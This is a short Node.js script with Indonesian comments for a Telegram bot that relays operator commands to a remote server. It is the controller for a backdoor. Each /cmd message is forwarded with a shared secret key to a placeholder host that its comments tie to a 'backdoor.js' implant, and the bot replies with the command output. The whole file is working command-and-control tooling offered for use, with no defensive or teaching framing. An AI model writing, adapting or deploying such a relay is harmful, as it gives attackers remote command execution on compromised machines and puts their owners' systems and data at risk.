const { Telegraf } = require('telegraf');
const axios = require('axios');

const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');
const SECRET_KEY = 'SECRETKEY'; // Sesuaikan dengan yang di backdoor.js
const SERVER_URL = 'http://contoh.com:3000/cmd'; // Sesuaikan portnya

bot.command('cmd', async (ctx) => {
    const command = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah /cmd
    if (!command) {
        ctx.reply('Gunakan format: /cmd <perintah>');
        return;
    }

    try {
        const response = await axios.get(`${SERVER_URL}?key=${SECRET_KEY}&cmd=${encodeURIComponent(command)}`);
        ctx.reply(`Output:\n${response.data}`);
    } catch (error) {
        ctx.reply('Gagal mengeksekusi perintah.');
    }
});

bot.launch();
